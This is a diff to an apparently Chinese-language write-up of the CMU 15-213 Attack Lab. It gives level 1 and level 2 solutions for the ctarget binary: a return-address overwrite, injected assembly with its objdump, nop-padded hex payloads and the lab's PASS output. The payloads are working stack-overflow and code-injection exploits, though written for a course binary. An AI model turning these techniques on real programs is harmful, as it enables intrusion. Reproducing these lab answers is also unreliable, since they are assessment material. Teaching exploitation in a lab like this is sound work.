@@ -64,13 +64,13 @@ buf[43] = buf[44] = buf[45] = buf[46] = buf[47] = 0x00;
 
 具体步骤：
 
-1. 创建含有以下内容（前 40 个字符相对随意，避开 `\n` 及 `EOF` 即可）的 `exploit.txt` 文件：
+1. 创建含有以下内容（前 40 个字符相对随意，避开 `0x0a` 即 `\n` 即可）的 `exploit.txt` 文件：
 
    ```c
-   30 31 32 33 34 35 36 37 38 39 /* 10 */
-   30 31 32 33 34 35 36 37 38 39 /* 20 */
-   30 31 32 33 34 35 36 37 38 39 /* 30 */
-   30 31 32 33 34 35 36 37 38 39 /* 40 */
+   /* buf[00,10) */ 30 31 32 33 34 35 36 37 38 39
+   /* buf[10,20) */ 30 31 32 33 34 35 36 37 38 39
+   /* buf[20,30) */ 30 31 32 33 34 35 36 37 38 39
+   /* buf[30,40) */ 30 31 32 33 34 35 36 37 38 39
    c0 17 40 00 00 00 00 00 /* address of touch1() */
    ```
 
@@ -91,4 +91,69 @@ buf[43] = buf[44] = buf[45] = buf[46] = buf[47] = 0x00;
    ```shell
    $ cat exploit.txt | ./hex2raw | ./ctarget -q
    ```
+
+最终得以下输出
+```
+Cookie: 0x59b997fa
+Type string:Touch1!: You called touch1()
+Valid solution for level 1 with target ctarget
+PASS: Would have posted the following:
+        user id bovik
+        course  15213-f15
+        lab     attacklab
+        result  1:PASS:0xffffffff:ctarget:1:30 31 32 33 34 35 36 37 38 39 30 31 32 33 34 35 36 37 38 39 30 31 32 33 34 35 36 37 38 39 30 31 32 33 34 35 36 37 38 39 C0 17 40 00 00 00 00 00 
+```
+
+## 第二关
+
+需要植入的指令为：
+```gas
+# exploit.s
+movl  $0x59b997fa, %edi # cookie
+pushq $0x004017ec       # address of touch2()
+retq
+```
+先汇编，再反汇编：
+```shell
+$ gcc -c exploit.s && objdump -d exploit.o
+```
+得以下输出：
+```
+exploit.o:     file format elf64-x86-64
+
+
+Disassembly of section .text:
+
+0000000000000000 <.text>:
+   0:   bf fa 97 b9 59          mov    $0x59b997fa,%edi
+   5:   68 ec 17 40 00          pushq  $0x4017ec
+   a:   c3                      retq
+```
+
+为便于调试，按每行 8 字节排列，并以 `0x90` 即 `nop` 指令占位：
+```c
+/* exploit.txt */
+/* 0x5561dc78 */ 90 90 90 90 90 90 90 90
+/* 0x5561dc80 */ bf fa 97 b9 59 /* mov  */ 90 90 90
+/* 0x5561dc88 */ 68 ec 17 40 00 /* push */ 90 90 90
+/* 0x5561dc90 */ c3 /* retq */ 90 90 90 90 90 90 90
+/* 0x5561dc98 */ 90 90 90 90 90 90 90 90
+/* 0x5561dca0 */ 78 dc 61 55 00 00 00 00 /* 0x5561dca0 - 40 */
+```
+
+```shell
+$ cat exploit.txt | ./hex2raw | ./ctarget -q
+```
+
+最终得以下输出：
+```
+Cookie: 0x59b997fa
+Type string:Touch2!: You called touch2(0x59b997fa)
+Valid solution for level 2 with target ctarget
+PASS: Would have posted the following:
+        user id bovik
+        course  15213-f15
+        lab     attacklab
+        result  1:PASS:0xffffffff:ctarget:2:90 90 90 90 90 90 90 90 BF FA 97 B9 59 90 90 90 68 EC 17 40 00 90 90 90 C3 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 78 DC 61 55 00 00 00 00 
+```
 
